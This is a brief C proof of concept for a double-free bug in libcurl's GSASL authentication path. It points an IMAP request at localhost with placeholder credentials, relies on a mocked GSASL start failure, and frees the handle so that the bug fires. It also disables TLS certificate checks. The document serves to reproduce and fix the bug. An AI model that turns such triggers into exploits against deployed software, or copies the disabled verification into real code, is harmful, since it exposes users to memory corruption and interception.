/* PoC for GSASL double-free bug */
#include <curl/curl.h>
#include <stdio.h>

int main(void) {
    CURL *easy;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    easy = curl_easy_init();

    if(!easy) {
        fprintf(stderr, "curl_easy_init failed\n");
        return 1;
    }

    /* Use a local server that won't actually connect, but we need to trigger
     * the SASL path. We'll use a non-existent server - the connection will fail
     * but the SASL mechanism selection should still happen. */
    curl_easy_setopt(easy, CURLOPT_URL, "imap://localhost:143/");
    curl_easy_setopt(easy, CURLOPT_USERNAME, "user");
    curl_easy_setopt(easy, CURLOPT_PASSWORD, "pass");
    curl_easy_setopt(easy, CURLOPT_CONNECTTIMEOUT, 1L);  /* Quick timeout */
    curl_easy_setopt(easy, CURLOPT_TIMEOUT, 2L);

    /* Disable SSL verification since we're not really connecting */
    curl_easy_setopt(easy, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(easy, CURLOPT_SSL_VERIFYHOST, 0L);

    /* This should trigger sasl_choose_gsasl -> Curl_auth_gsasl_is_supported
     * which will call gsasl_client_start that we mock to fail */
    res = curl_easy_perform(easy);

    fprintf(stderr, "curl_easy_perform returned: %d\n", res);

    /* This cleanup should trigger the double-free via gsasl_conn_dtor */
    curl_easy_cleanup(easy);
    fprintf(stderr, "curl_easy_cleanup done\n");

    curl_global_cleanup();
    fprintf(stderr, "curl_global_cleanup done\n");

    return 0;
}

